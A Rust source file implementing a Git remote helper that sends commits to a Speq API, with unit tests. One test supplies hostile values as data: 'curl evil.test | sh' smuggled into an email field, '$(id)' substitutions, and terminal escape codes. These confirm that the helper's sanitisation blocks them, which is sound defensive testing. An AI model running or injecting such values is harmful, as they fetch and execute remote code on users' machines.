//! `git-remote-speq`: Git's remote helper for `speq::<api>/v1/projects/<id>` push URLs (see gitremote-helpers(7)).
//! Git decides what to push and checks fast-forwards itself; this helper sends each new commit as its raw object plus
//! its changes, and the API re-creates them on GitHub with the same SHAs. Fetching never comes here: the fetch URL is
//! the API's read-only Git endpoint.
use crate::api::{GitPushRequest, ProjectSummary, PushedChange, PushedCommit, printable};
use crate::env::Env;
use crate::error::{Error, Result};
use crate::git::Git;
use crate::paths::{is_canonical_document, matches_rule};
use crate::repo::parse_address;
use crate::session::{Authed, Session};
use std::collections::HashSet;
use std::io::{BufRead, Write};
use std::path::PathBuf;

/// The only branch the remote has.
pub const MAIN: &str = "refs/heads/main";
/// Commits per push, as the API allows.
pub const MAX_COMMITS: usize = 20;
const SQUASH_HINT: &str = "squash them with `speq push --squash`";

/// One `push [+]<src>:<dst>` line.
#[derive(Debug, PartialEq, Eq)]
pub struct PushSpec {
    pub force: bool,
    pub src: String,
    pub dst: String,
}

pub fn parse_push(line: &str) -> Option<PushSpec> {
    let spec = line.strip_prefix("push ")?;
    let (force, spec) = match spec.strip_prefix('+') {
        Some(rest) => (true, rest),
        None => (false, spec),
    };
    let (src, dst) = spec.split_once(':')?;
    Some(PushSpec {
        force,
        src: src.to_string(),
        dst: dst.to_string(),
    })
}

/// Why a ref cannot be pushed before anything is sent, or None when it may be.
pub fn refuse(spec: &PushSpec) -> Option<String> {
    if spec.src.is_empty() {
        return Some("deleting a branch on the Speq remote is not possible".into());
    }
    if spec.dst != MAIN {
        return Some(format!(
            "the Speq remote only has main; push your branch with `speq push origin {}:main`",
            spec.src.strip_prefix("refs/heads/").unwrap_or(&spec.src)
        ));
    }
    if spec.force {
        return Some(
            "history on the Speq remote cannot be rewritten; run `speq pull` and push again".into(),
        );
    }
    None
}

/// The parent a commit's changes are sent relative to: the first one already on the remote, else the first one.
pub fn base_parent<'a>(parents: &'a [String], pushed: &HashSet<String>) -> Option<&'a String> {
    parents
        .iter()
        .find(|p| !pushed.contains(*p))
        .or_else(|| parents.first())
}

/// `parent <sha>` lines of a raw commit object (they all come before the first blank line).
pub fn parents_of(raw: &str) -> Vec<String> {
    raw.lines()
        .take_while(|l| !l.is_empty())
        .filter_map(|l| l.strip_prefix("parent "))
        .map(str::to_string)
        .collect()
}

/// One entry of `git diff-tree -r -z --no-renames`.
#[derive(Debug, PartialEq, Eq)]
pub struct TreeChange {
    pub status: char,
    pub new_mode: String,
    pub new_sha: String,
    pub path: String,
}

pub fn parse_diff_tree(output: &[u8]) -> Result<Vec<TreeChange>> {
    let malformed = || Error::Other("unexpected `git diff-tree` output".into());
    let mut fields = output.split(|b| *b == 0).filter(|f| !f.is_empty());
    let mut changes = Vec::new();
    while let Some(meta) = fields.next() {
        let meta = std::str::from_utf8(meta).map_err(|_| malformed())?;
        let path = fields.next().ok_or_else(malformed)?;
        let path =
            std::str::from_utf8(path).map_err(|_| Error::invalid("a changed path is not UTF-8"))?;
        // `:<old mode> <new mode> <old sha> <new sha> <status>`
        let parts: Vec<&str> = meta.trim_start_matches(':').split(' ').collect();
        let [_, new_mode, _, new_sha, status] = parts.as_slice() else {
            return Err(malformed());
        };
        changes.push(TreeChange {
            status: status.chars().next().ok_or_else(malformed)?,
            new_mode: new_mode.to_string(),
            new_sha: new_sha.to_string(),
            path: path.to_string(),
        });
    }
    Ok(changes)
}

/// Why `local` cannot fast-forward the remote at `remote_head`, in the words Git understands (it then prints its
/// usual advice to pull first), or None when it can.
pub fn behind(git: &Git, remote_head: &str, local: &str) -> Result<Option<&'static str>> {
    if !git.succeeds(
        None,
        ["cat-file", "-e", &format!("{remote_head}^{{commit}}")],
    )? {
        return Ok(Some("fetch first"));
    }
    if !git.succeeds(None, ["merge-base", "--is-ancestor", remote_head, local])? {
        return Ok(Some("non-fast-forward"));
    }
    Ok(None)
}

/// The commits Git wants to push, parents first, as the API takes them.
pub fn collect_commits(git: &Git, local: &str, remote_head: &str) -> Result<Vec<PushedCommit>> {
    let list = git.text(
        None,
        [
            "rev-list",
            "--reverse",
            "--topo-order",
            local,
            "--not",
            remote_head,
        ],
    )?;
    let shas: Vec<String> = list.lines().map(str::to_string).collect();
    if shas.len() > MAX_COMMITS {
        return Err(Error::invalid(format!(
            "{} commits are waiting to be pushed and a push may carry at most {MAX_COMMITS}; {SQUASH_HINT}",
            shas.len()
        )));
    }
    let pushed: HashSet<String> = shas.iter().cloned().collect();
    let mut commits = Vec::with_capacity(shas.len());
    for sha in shas {
        let raw = String::from_utf8(git.bytes(None, ["cat-file", "commit", &sha])?)
            .map_err(|_| Error::invalid(format!("commit {sha} is not UTF-8 text")))?;
        let parents = parents_of(&raw);
        let base = base_parent(&parents, &pushed)
            .ok_or_else(|| {
                Error::invalid(format!(
                    "commit {sha} has no parent; a new history cannot be pushed"
                ))
            })?
            .clone();
        let diff = git.bytes(
            None,
            [
                "diff-tree",
                "-r",
                "-z",
                "--no-renames",
                "--no-commit-id",
                "--full-index",
                &base,
                &sha,
            ],
        )?;
        let mut changes = Vec::new();
        for change in parse_diff_tree(&diff)? {
            if !is_canonical_document(&change.path) {
                return Err(Error::invalid(format!(
                    "{} is not a Speq document path; only llms.txt, development_status.md, README.md, architecture.md, design/ and epics/ documents can be pushed",
                    change.path
                )));
            }
            let content = match change.status {
                'D' => None,
                'A' | 'M' if change.new_mode == "100644" => {
                    let blob = git.bytes(None, ["cat-file", "blob", &change.new_sha])?;
                    Some(String::from_utf8(blob).map_err(|_| {
                        Error::invalid(format!("{} is not UTF-8 text", change.path))
                    })?)
                }
                _ => {
                    return Err(Error::invalid(format!(
                        "{} must be a regular file (no symlinks or executable bits)",
                        change.path
                    )));
                }
            };
            changes.push(PushedChange {
                path: change.path,
                content,
            });
        }
        commits.push(PushedCommit {
            sha,
            raw,
            base,
            changes,
        });
    }
    Ok(commits)
}

/// Paths the cached capabilities say this user may not change: a warning only, the API decides.
pub fn likely_denied(project: &ProjectSummary, commits: &[PushedCommit], git: &Git) -> Vec<String> {
    let mut denied = Vec::new();
    for commit in commits {
        for change in &commit.changes {
            let exists = git
                .succeeds(
                    None,
                    [
                        "cat-file",
                        "-e",
                        &format!("{}:{}", commit.base, change.path),
                    ],
                )
                .unwrap_or(true);
            let rules = if change.content.is_some() && !exists {
                &project.capabilities.create
            } else {
                &project.capabilities.update
            };
            let allowed = !rules.deny.iter().any(|p| matches_rule(p, &change.path))
                && rules.allow.iter().any(|p| matches_rule(p, &change.path));
            if !allowed && !denied.contains(&change.path) {
                denied.push(change.path.clone());
            }
        }
    }
    denied
}

/// `name@domain` made only of characters that mean nothing to a shell.
fn is_plain_email(email: &str) -> bool {
    let plain = |part: &str| {
        !part.is_empty()
            && part
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '%' | '+' | '-'))
    };
    email.len() <= 254
        && email
            .split_once('@')
            .is_some_and(|(name, domain)| plain(name) && plain(domain))
}

/// The reason Git prints after `! [remote rejected]`, and any detail for the terminal. `fetch first` is one of the
/// reasons Git itself understands: it then prints its usual hint to pull first.
pub fn rejection(error: &Error) -> (String, Vec<String>) {
    match error {
        Error::NotLoggedIn | Error::SessionExpired => {
            ("not logged in to Speq; run `speq login`".into(), vec![])
        }
        Error::Api(e) => match e.code.as_str() {
            "fetch_first" | "head_changed" => ("fetch first".into(), vec![]),
            "policy_denied" => {
                let paths = e
                    .details
                    .as_ref()
                    .and_then(|d| d.as_array())
                    .map(|items| {
                        items
                            .iter()
                            .map(|i| {
                                format!(
                                    "not allowed: {} {}",
                                    printable(i["action"].as_str().unwrap_or("change")),
                                    printable(i["path"].as_str().unwrap_or("?"))
                                )
                            })
                            .collect()
                    })
                    .unwrap_or_default();
                (
                    "your role may not change every document in this push".into(),
                    paths,
                )
            }
            "identity_mismatch" => {
                // It lands in a command users (and agents) copy into a shell: only a plain address goes there.
                let expected = e
                    .details
                    .as_ref()
                    .and_then(|d| d["expected"].as_str())
                    .filter(|email| is_plain_email(email))
                    .unwrap_or("your Speq email")
                    .to_string();
                (
                    format!("commits must be authored as {expected}"),
                    vec![format!(
                        "fix with: speq config user.email {expected} && speq commit --amend --no-edit --reset-author (older commits: speq rebase origin/main --exec \"git commit --amend --no-edit --reset-author\")"
                    )],
                )
            }
            "too_many_commits" => (format!("too many commits; {SQUASH_HINT}"), vec![]),
            _ => (format!("{} ({})", e.message, e.code), vec![]),
        },
        other => (other.to_string(), vec![]),
    }
}

struct Helper {
    env: Env,
    git: Git,
    project_id: String,
    auth: Option<Authed>,
    remote_head: Option<String>,
}

impl Helper {
    async fn authed(&mut self) -> Result<&Authed> {
        if self.auth.is_none() {
            self.auth = Some(Session::new(&self.env).authenticate().await?);
        }
        Ok(self.auth.as_ref().expect("set above"))
    }

    async fn list(&mut self) -> Result<String> {
        let token = self.authed().await?.token.clone();
        let head = self.env.client.git_head(&token, &self.project_id).await?;
        self.remote_head = Some(head.clone());
        Ok(format!("{head} {MAIN}\n@{MAIN} HEAD\n"))
    }

    /// One status line (`ok <dst>` / `error <dst> <why>`) for one ref.
    async fn push(&mut self, spec: &PushSpec, errors: &mut impl Write) -> String {
        if let Some(why) = refuse(spec) {
            return format!("error {} {why}\n", spec.dst);
        }
        match self.send(spec, errors).await {
            Ok(()) => format!("ok {}\n", spec.dst),
            Err(error) => {
                let (why, details) = rejection(&error);
                for line in details {
                    let _ = writeln!(errors, "speq: {line}");
                }
                // One protocol line: a newline in the reason would add statuses Git believes.
                format!("error {} {}\n", spec.dst, printable(&why))
            }
        }
    }

    async fn send(&mut self, spec: &PushSpec, errors: &mut impl Write) -> Result<()> {
        let head = match &self.remote_head {
            Some(head) => head.clone(),
            None => {
                self.list().await?;
                self.remote_head.clone().unwrap_or_default()
            }
        };
        let local = self
            .git
            .text(
                None,
                ["rev-parse", "--verify", &format!("{}^{{commit}}", spec.src)],
            )?
            .trim()
            .to_string();
        if let Some(why) = behind(&self.git, &head, &local)? {
            return Err(Error::conflict(why));
        }
        let commits = collect_commits(&self.git, &local, &head)?;
        if commits.is_empty() {
            return Ok(());
        }
        if let Ok(snapshot) = Session::new(&self.env).snapshot().await
            && let Some(project) = snapshot
                .projects
                .iter()
                .find(|p| p.project_id == self.project_id)
        {
            for path in likely_denied(project, &commits, &self.git) {
                let _ = writeln!(
                    errors,
                    "speq: warning: your role may not be allowed to change {path}"
                );
            }
        }
        let token = self.authed().await?.token.clone();
        let request = GitPushRequest {
            old_head: &head,
            commits: &commits,
        };
        let result = self
            .env
            .client
            .git_push(&token, &self.project_id, &request)
            .await;
        if let Err(Error::Api(e)) = &result
            && e.status == 403
            && let Some(auth) = &self.auth
        {
            // A denial may mean the role changed: refresh the cached capabilities for the next warning.
            Session::new(&self.env).after_forbidden(auth).await;
        }
        result.map(|_| ())
    }
}

async fn serve(
    address: &str,
    input: impl BufRead,
    mut output: impl Write,
    mut errors: impl Write,
) -> Result<()> {
    let (api_url, project_id) = parse_address(address)?;
    // Git names the repository through `GIT_DIR`, which speq never passes on to the Git it runs.
    let git_dir = std::env::var_os("GIT_DIR")
        .map(PathBuf::from)
        .ok_or_else(|| {
            Error::invalid("git-remote-speq is run by Git (`speq push`), not by hand")
        })?;
    let git_dir = std::path::absolute(&git_dir).unwrap_or(git_dir);
    let mut helper = Helper {
        env: Env::production(Some(api_url.as_str()), false)?,
        git: Git::locate(None)?.with_git_dir(git_dir),
        project_id,
        auth: None,
        remote_head: None,
    };

    let mut lines = input.lines();
    while let Some(line) = lines.next() {
        let line = line.map_err(|e| Error::Other(format!("read from Git: {e}")))?;
        let reply = match line.as_str() {
            "" => break,
            "capabilities" => "push\n\n".to_string(),
            "list" | "list for-push" => format!("{}\n", helper.list().await?),
            push if push.starts_with("push ") => {
                // A batch of `push` lines ends with a blank line; each gets one status line.
                let mut specs = vec![parse_push(push)];
                for next in lines.by_ref() {
                    let next = next.map_err(|e| Error::Other(format!("read from Git: {e}")))?;
                    if next.is_empty() {
                        break;
                    }
                    specs.push(parse_push(&next));
                }
                let mut reply = String::new();
                for spec in specs {
                    let Some(spec) = spec else {
                        return Err(Error::Other("unexpected push line from Git".into()));
                    };
                    reply.push_str(&helper.push(&spec, &mut errors).await);
                }
                reply.push('\n');
                reply
            }
            other => {
                return Err(Error::Other(format!(
                    "unsupported request from Git: {other:?}"
                )));
            }
        };
        output
            .write_all(reply.as_bytes())
            .and_then(|()| output.flush())
            .map_err(|e| Error::Other(format!("write to Git: {e}")))?;
    }
    Ok(())
}

/// Entry point when the binary runs as `git-remote-speq <remote> <address>`.
pub fn main(args: &[std::ffi::OsString]) -> u8 {
    let Some(address) = args.get(2).and_then(|a| a.to_str()) else {
        eprintln!("speq: git-remote-speq is run by Git with a remote name and a speq:: address");
        return 2;
    };
    let runtime = match tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
    {
        Ok(runtime) => runtime,
        Err(e) => {
            eprintln!("speq: cannot start the runtime: {e}");
            return 1;
        }
    };
    let stdin = std::io::stdin();
    let outcome = runtime.block_on(serve(
        address,
        stdin.lock(),
        std::io::stdout(),
        std::io::stderr(),
    ));
    match outcome {
        Ok(()) => 0,
        Err(e) => {
            let hint = e.hint().map(|h| format!(" ({h})")).unwrap_or_default();
            eprintln!("speq: {}{hint}", e.detail());
            128
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::error::ApiError;

    #[test]
    fn push_lines_and_what_is_refused_before_sending() {
        let plain = parse_push("push refs/heads/main:refs/heads/main").unwrap();
        assert_eq!(
            plain,
            PushSpec {
                force: false,
                src: "refs/heads/main".into(),
                dst: MAIN.into()
            }
        );
        assert_eq!(refuse(&plain), None);

        let forced = parse_push("push +refs/heads/main:refs/heads/main").unwrap();
        assert!(refuse(&forced).unwrap().contains("cannot be rewritten"));
        let delete = parse_push("push :refs/heads/main").unwrap();
        assert!(refuse(&delete).unwrap().contains("deleting"));
        let branch = parse_push("push refs/heads/draft:refs/heads/draft").unwrap();
        assert!(
            refuse(&branch)
                .unwrap()
                .contains("speq push origin draft:main")
        );
        let tag = parse_push("push refs/tags/v1:refs/tags/v1").unwrap();
        assert!(refuse(&tag).unwrap().contains("only has main"));
        assert_eq!(parse_push("push nonsense"), None);
        assert_eq!(parse_push("fetch a b"), None);
    }

    #[test]
    fn a_merge_is_sent_relative_to_its_parent_already_on_the_remote() {
        let parents = vec!["mine".to_string(), "theirs".to_string()];
        let pushed: HashSet<String> = ["mine".to_string()].into();
        assert_eq!(base_parent(&parents, &pushed).unwrap(), "theirs");
        let all: HashSet<String> = ["mine".to_string(), "theirs".to_string()].into();
        assert_eq!(base_parent(&parents, &all).unwrap(), "mine");
        assert_eq!(base_parent(&[], &all), None);
    }

    #[test]
    fn parents_come_only_from_the_header() {
        let raw = "tree t\nparent a\nparent b\nauthor x\ncommitter x\n\nparent c is not a header\n";
        assert_eq!(parents_of(raw), ["a", "b"]);
    }

    #[test]
    fn diff_tree_entries_are_parsed_with_paths_containing_spaces() {
        let z = |s: &str| s.replace('|', "\0").into_bytes();
        let out = z(
            ":100644 100644 aaa bbb M|epics/a b/prd.md|:000000 100644 000 ccc A|llms.txt|:100644 000000 ddd 000 D|old.md|",
        );
        let changes = parse_diff_tree(&out).unwrap();
        assert_eq!(changes.len(), 3);
        assert_eq!(
            changes[0],
            TreeChange {
                status: 'M',
                new_mode: "100644".into(),
                new_sha: "bbb".into(),
                path: "epics/a b/prd.md".into()
            }
        );
        assert_eq!((changes[1].status, changes[2].status), ('A', 'D'));
        assert!(parse_diff_tree(&z(":100644 100644 aaa M|x|")).is_err());
        assert!(parse_diff_tree(&z(":100644 100644 aaa bbb M|")).is_err());
    }

    fn api(code: &str, status: u16, details: Option<serde_json::Value>) -> Error {
        Error::Api(Box::new(ApiError {
            status,
            code: code.into(),
            message: "message".into(),
            request_id: None,
            details,
            retry_after: None,
        }))
    }

    #[test]
    fn api_rejections_become_git_statuses_and_terminal_details() {
        assert_eq!(rejection(&api("fetch_first", 409, None)).0, "fetch first");
        let (why, lines) = rejection(&api(
            "policy_denied",
            403,
            Some(serde_json::json!([{ "sha": "s", "path": "epics/a/prd.md", "action": "update" }])),
        ));
        assert!(why.contains("may not change"));
        assert_eq!(lines, ["not allowed: update epics/a/prd.md"]);
        let (why, lines) = rejection(&api(
            "identity_mismatch",
            422,
            Some(serde_json::json!({ "expected": "me@acme.test" })),
        ));
        assert_eq!(why, "commits must be authored as me@acme.test");
        assert!(lines[0].contains("speq config user.email me@acme.test"));
        assert!(
            rejection(&api("too_many_commits", 422, None))
                .0
                .contains("speq push --squash")
        );
        assert!(rejection(&Error::SessionExpired).0.contains("speq login"));
        assert_eq!(
            rejection(&api("tree_mismatch", 422, None)).0,
            "message (tree_mismatch)"
        );
    }

    #[test]
    fn server_details_never_become_shell_commands_or_extra_lines() {
        let (why, lines) = rejection(&api(
            "identity_mismatch",
            422,
            Some(serde_json::json!({ "expected": "me@acme.test; curl evil.test | sh" })),
        ));
        assert_eq!(why, "commits must be authored as your Speq email");
        assert!(!lines[0].contains("curl"), "{}", lines[0]);
        for bad in [
            "me@acme.test$(id)",
            "`id`@acme.test",
            "me@acme.test\nok",
            "me acme.test",
            "@acme.test",
            "me@",
        ] {
            assert!(!is_plain_email(bad), "{bad:?}");
        }
        for good in ["me@acme.test", "first.last+specs@sub.acme-corp.co.id"] {
            assert!(is_plain_email(good), "{good:?}");
        }

        let (_, lines) = rejection(&api(
            "policy_denied",
            403,
            Some(serde_json::json!([{ "path": "a.md\n\x1b[2Jok", "action": "update\r" }])),
        ));
        assert_eq!(lines, ["not allowed: update  a.md  [2Jok"]);
    }
}
